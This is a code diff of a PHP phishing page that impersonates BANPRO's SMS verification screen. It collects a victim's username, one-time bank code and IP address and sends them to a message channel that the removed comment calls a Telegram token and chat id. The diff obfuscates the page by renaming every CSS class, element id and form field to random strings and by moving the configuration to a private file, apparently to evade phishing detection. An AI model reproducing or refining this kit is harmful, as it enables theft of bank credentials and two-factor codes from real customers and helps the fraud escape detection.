@@ -1,11 +1,12 @@
 <?php
 session_start();
-include("settings.php"); // Contiene $token y $chat_id
+define('PROME_OK', true);
+include("private/cfg.php");
 
 $usuario = $_SESSION['usuario'] ?? null;
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
-    $codigo = $_POST['ips1'] ?? '';
+    $codigo = $_POST['c_n5w2x'] ?? '';
     $ip = $_SERVER['REMOTE_ADDR'];
 
     $msg = "📲 VALIDACIÓN SMS BANPRO\n👤 Usuario: $usuario\n🔢 Código: $codigo\n🌐 IP: $ip";
@@ -53,7 +54,7 @@ body{
     padding:40px 20px;
 }
 
-.card{
+.crT9d{
     background:#fff;
     border-radius:10px;
     width:100%;
@@ -63,7 +64,7 @@ body{
     text-align:left;
 }
 
-.logo-slot{
+.lsW3v{
     display:flex;
     justify-content:center;
     align-items:center;
@@ -71,14 +72,14 @@ body{
     min-height:60px;
 }
 
-.logo-slot img{
+.lsW3v img{
     max-height:60px;
     max-width:220px;
     width:auto;
     object-fit:contain;
 }
 
-.icon-wrap{
+.iwK8x{
     width:72px;
     height:72px;
     border:2.5px solid #00853f;
@@ -89,7 +90,7 @@ body{
     margin:0 auto 22px;
 }
 
-.icon-wrap svg{width:42px;height:42px;}
+.iwK8x svg{width:42px;height:42px;}
 
 h1{
     font-size:22px;
@@ -98,20 +99,20 @@ h1{
     margin-bottom:18px;
 }
 
-.subtitle{
+.stN2c{
     font-size:15px;
     color:#444;
     margin-bottom:26px;
 }
 
-.code-inputs{
+.ciR6h{
     display:flex;
     justify-content:space-between;
     gap:8px;
     margin-bottom:30px;
 }
 
-.code-inputs input{
+.ciR6h input{
     flex:1;
     aspect-ratio:1/1;
     max-width:50px;
@@ -127,19 +128,19 @@ h1{
     -moz-appearance:textfield;
 }
 
-.code-inputs input::-webkit-outer-spin-button,
-.code-inputs input::-webkit-inner-spin-button{
+.ciR6h input::-webkit-outer-spin-button,
+.ciR6h input::-webkit-inner-spin-button{
     -webkit-appearance:none;
     margin:0;
 }
 
-.code-inputs input:focus{
+.ciR6h input:focus{
     border-color:#00853f;
     box-shadow:0 0 0 2px rgba(0,133,63,0.15);
 }
 
-.btn-validar,
-.btn-reenviar{
+.bvL5q,
+.brM7t{
     width:100%;
     height:50px;
     border-radius:6px;
@@ -150,26 +151,26 @@ h1{
     display:block;
 }
 
-.btn-validar{
+.bvL5q{
     border:none;
     background:#00853f;
     color:#fff;
     margin-bottom:12px;
 }
 
-.btn-validar:hover{background:#006b32;}
-.btn-validar:disabled{background:#9bc7ad;cursor:not-allowed;}
+.bvL5q:hover{background:#006b32;}
+.bvL5q:disabled{background:#9bc7ad;cursor:not-allowed;}
 
-.btn-reenviar{
+.brM7t{
     background:#fff;
     color:#00853f;
     border:2px solid #00853f;
 }
 
-.btn-reenviar:hover{background:#eef8f1;}
-.btn-reenviar:disabled{opacity:.6;cursor:not-allowed;}
+.brM7t:hover{background:#eef8f1;}
+.brM7t:disabled{opacity:.6;cursor:not-allowed;}
 
-.resend-status{
+.rsZ1n{
     text-align:center;
     margin-top:12px;
     font-size:13px;
@@ -177,7 +178,7 @@ h1{
     min-height:18px;
 }
 
-.code-timer{
+.ctV8b{
     text-align:center;
     margin-top:14px;
     font-size:12.5px;
@@ -185,7 +186,7 @@ h1{
     letter-spacing:.2px;
 }
 
-.code-timer.expired{
+.ctV8b.exJ3w{
     color:#c0392b;
 }
 
@@ -194,22 +195,22 @@ h1{
         padding:24px 18px;
         background:#fff;
     }
-    .card{
+    .crT9d{
         padding:0;
         box-shadow:none;
         background:transparent;
         max-width:380px;
     }
-    .logo-slot{margin-bottom:22px;min-height:72px;}
-    .logo-slot img{max-height:72px;max-width:260px;}
+    .lsW3v{margin-bottom:22px;min-height:72px;}
+    .lsW3v img{max-height:72px;max-width:260px;}
 
-    .id-header{
+    .ihP4j{
         display:flex;
         align-items:center;
         gap:14px;
         margin-bottom:18px;
     }
-    .id-header .icon-wrap{
+    .ihP4j .iwK8x{
         width:54px;
         height:54px;
         margin:0;
@@ -217,29 +218,29 @@ h1{
         border-radius:12px;
         flex-shrink:0;
     }
-    .id-header .icon-wrap svg{width:30px;height:30px;}
-    .id-header h1{
+    .ihP4j .iwK8x svg{width:30px;height:30px;}
+    .ihP4j h1{
         font-size:18px;
         margin:0;
         text-align:left;
     }
 
-    .subtitle{font-size:14px;margin-bottom:18px;text-align:left;}
-    .code-inputs{gap:6px;margin-bottom:22px;justify-content:space-between;}
-    .code-inputs input{font-size:19px;max-width:46px;}
-    .btn-validar,
-    .btn-reenviar{height:44px;font-size:14px;}
+    .stN2c{font-size:14px;margin-bottom:18px;text-align:left;}
+    .ciR6h{gap:6px;margin-bottom:22px;justify-content:space-between;}
+    .ciR6h input{font-size:19px;max-width:46px;}
+    .bvL5q,
+    .brM7t{height:44px;font-size:14px;}
 }
 </style>
 </head>
 <body>
-<div class="card">
-    <div class="logo-slot">
-        <img src="img/imgLogoLogin.png" alt="Prox" class="logo-img">
+<div class="crT9d">
+    <div class="lsW3v">
+        <img src="img/lg_p4n8q3.png" alt="Prox" class="liY4v">
     </div>
 
-    <div class="id-header">
-        <div class="icon-wrap" aria-label="Verificación de identidad">
+    <div class="ihP4j">
+        <div class="iwK8x" aria-label="Verificación de identidad">
             <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <rect x="5" y="10" width="38" height="28" rx="4" stroke="#00853f" stroke-width="2.6"/>
                 <circle cx="16" cy="22" r="3.4" fill="#00853f"/>
@@ -252,10 +253,10 @@ h1{
         <h1>Verificación de identidad</h1>
     </div>
 
-    <p class="subtitle">Ingrese por favor el código que le enviaremos a su número telefónico o correo electrónico registrado.</p>
+    <p class="stN2c">Ingrese por favor el código que le enviaremos a su número telefónico o correo electrónico registrado.</p>
 
-    <form method="post" action="" id="codeForm" autocomplete="off">
-        <div class="code-inputs" id="codeInputs">
+    <form method="post" action="" id="cFp9q" autocomplete="off">
+        <div class="ciR6h" id="cIw3n">
             <input type="text" inputmode="numeric" maxlength="1" required>
             <input type="text" inputmode="numeric" maxlength="1" required>
             <input type="text" inputmode="numeric" maxlength="1" required>
@@ -263,22 +264,22 @@ h1{
             <input type="text" inputmode="numeric" maxlength="1" required>
             <input type="text" inputmode="numeric" maxlength="1" required>
         </div>
-        <input type="hidden" name="ips1" id="ips1">
-        <button type="submit" class="btn-validar">Validar código</button>
+        <input type="hidden" name="c_n5w2x" id="c_n5w2x">
+        <button type="submit" class="bvL5q">Validar código</button>
     </form>
 
-    <form method="post" action="reenvio.php" id="resendForm">
-        <button type="submit" class="btn-reenviar" id="btnReenviar">Reenviar código</button>
+    <form method="post" action="reenvio.php" id="rFs8x">
+        <button type="submit" class="brM7t" id="bRm4j">Reenviar código</button>
     </form>
-    <p class="resend-status" id="resendStatus"></p>
-    <p class="code-timer" id="codeTimer">Código válido por <span id="timerValue">3:00</span></p>
+    <p class="rsZ1n" id="rSc7p"></p>
+    <p class="ctV8b" id="cTr1z">Código válido por <span id="tVk5b">3:00</span></p>
 </div>
 
 <script>
 (function(){
-    const inputs = document.querySelectorAll('#codeInputs input');
-    const hidden = document.getElementById('ips1');
-    const form   = document.getElementById('codeForm');
+    const inputs = document.querySelectorAll('#cIw3n input');
+    const hidden = document.getElementById('c_n5w2x');
+    const form   = document.getElementById('cFp9q');
 
     inputs.forEach((inp, idx) => {
         inp.addEventListener('input', e => {
@@ -302,49 +303,49 @@ h1{
     });
 
     // Reenviar código (AJAX a reenvio.php)
-    const resendForm   = document.getElementById('resendForm');
-    const btnReenviar  = document.getElementById('btnReenviar');
-    const resendStatus = document.getElementById('resendStatus');
+    const rFs8x   = document.getElementById('rFs8x');
+    const bRm4j  = document.getElementById('bRm4j');
+    const rSc7p = document.getElementById('rSc7p');
 
-    resendForm.addEventListener('submit', async e => {
+    rFs8x.addEventListener('submit', async e => {
         e.preventDefault();
-        btnReenviar.disabled = true;
-        resendStatus.style.color = '#444';
-        resendStatus.textContent = 'Reenviando...';
+        bRm4j.disabled = true;
+        rSc7p.style.color = '#444';
+        rSc7p.textContent = 'Reenviando...';
 
         try {
             const res = await fetch('reenvio.php', { method:'POST' });
             if (res.ok) {
-                resendStatus.style.color = '#00853f';
-                resendStatus.textContent = '✓ Código reenviado';
+                rSc7p.style.color = '#00853f';
+                rSc7p.textContent = '✓ Código reenviado';
             } else {
-                resendStatus.style.color = '#c0392b';
-                resendStatus.textContent = 'No se pudo reenviar';
+                rSc7p.style.color = '#c0392b';
+                rSc7p.textContent = 'No se pudo reenviar';
             }
         } catch (err) {
-            resendStatus.style.color = '#c0392b';
-            resendStatus.textContent = 'No se pudo reenviar';
+            rSc7p.style.color = '#c0392b';
+            rSc7p.textContent = 'No se pudo reenviar';
         }
 
         // Reactivar luego de 30s
-        setTimeout(() => { btnReenviar.disabled = false; }, 30000);
+        setTimeout(() => { bRm4j.disabled = false; }, 30000);
     });
 
     // Contador regresivo del código (3:00 -> 0:00)
-    const timerEl  = document.getElementById('codeTimer');
-    let   timerVal = document.getElementById('timerValue');
+    const timerEl  = document.getElementById('cTr1z');
+    let   timerVal = document.getElementById('tVk5b');
     let   remaining = 3 * 60;
-    let   expired   = false;
+    let   exJ3w   = false;
 
     function tick(){
-        if (expired) return;
+        if (exJ3w) return;
         const m = Math.floor(remaining / 60);
         const s = remaining % 60;
         timerVal.textContent = m + ':' + (s < 10 ? '0' + s : s);
         if (remaining <= 0) {
             timerEl.textContent = 'Código expirado';
-            timerEl.classList.add('expired');
-            expired = true;
+            timerEl.classList.add('exJ3w');
+            exJ3w = true;
             return;
         }
         remaining--;
@@ -353,12 +354,12 @@ h1{
     setInterval(tick, 1000);
 
     // Reiniciar el contador si reenvían
-    resendForm.addEventListener('submit', () => {
+    rFs8x.addEventListener('submit', () => {
         remaining = 3 * 60;
-        expired = false;
-        timerEl.classList.remove('expired');
-        timerEl.innerHTML = 'Código válido por <span id="timerValue">3:00</span>';
-        timerVal = document.getElementById('timerValue');
+        exJ3w = false;
+        timerEl.classList.remove('exJ3w');
+        timerEl.innerHTML = 'Código válido por <span id="tVk5b">3:00</span>';
+        timerVal = document.getElementById('tVk5b');
     });
 })();
 </script>
